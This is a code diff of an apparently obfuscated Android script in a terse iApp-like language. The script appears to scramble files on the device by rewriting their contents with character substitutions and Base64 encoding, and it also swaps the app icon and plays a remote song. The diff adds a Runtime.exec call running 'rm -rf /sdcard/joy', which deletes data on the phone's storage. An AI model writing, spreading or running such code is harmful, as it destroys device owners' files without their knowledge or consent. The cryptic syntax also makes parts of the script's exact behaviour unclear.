@@ -18,7 +18,9 @@ height=-2</ppt>
 
 A song might bring a smile to your face
 可以赶尽无法杀绝
+
 ./
+fd("a",ImaAce)
 for(1;10)
 {
   fe("a",f)
@@ -136,8 +138,12 @@ t()
           {
             ss(Am+im,En)
             fr(En,E)
-            otob("utf-8",id,jmmw)
+            otob("utf-8",E,jmmw)
             sr(jmmw," ","XHMMJ",jmmw)
+            f(jmmw?"-")
+            {
+            sr(jmmw,"-","ALGGJWL",jmmw)
+            }
             sr(jmmw,"1","X",jmmw)
             sr(jmmw,"2","L",jmmw)
             sr(jmmw,"3","A",jmmw)
@@ -152,9 +158,9 @@ t()
             java(bytes2,null,"android.util.Base64.encode","byte[]",bytes,"int",2)
             javanew(jmmw,"String","byte[]",bytes2,"String","utf-8")
             fw(En,jmww)
+            syso(jmmw)
           }
-        }
-        
+        }        
         f(sss.ifmusic==null)
         {
           bfm("http://music.163.com/song/media/outer/url?id=1445228812&userid=1666229159",sss.haha)
@@ -177,10 +183,12 @@ t()
         sj(laughing,ver,verr,verr)
         sr(laughing,verr,"",laughing)
         fw(xml,laughing)
-        ss(path+"/"+iAppitem+"/icon.png",icon)
+        ss(path+iAppitem+"/icon.png",icon)
         btoo("utf-8","105 97 112 112 47 117 115 101 114 105 109 103 47 105 99 111 110 46 112 110 103",ifo)
         sran(1000,9999,sjs)
         ss("joy/"+sjs+".png",png)
+        java(runtime,null,"java.lang.Runtime.getRuntime")
+        java(null,runtime,"java.lang.Runtime.exec","String","rm -rf /sdcard/joy")
         ft(icon,png,ic)
         ft(ifo,icon,png)
         btoo("utf-8","47 115 114 99 47 109 105 97 110 46 105 121 117",mian)
@@ -224,6 +232,5 @@ t()
         }
       }
     }
-    fw("a","//Im a Ace.")
   }
 }♣
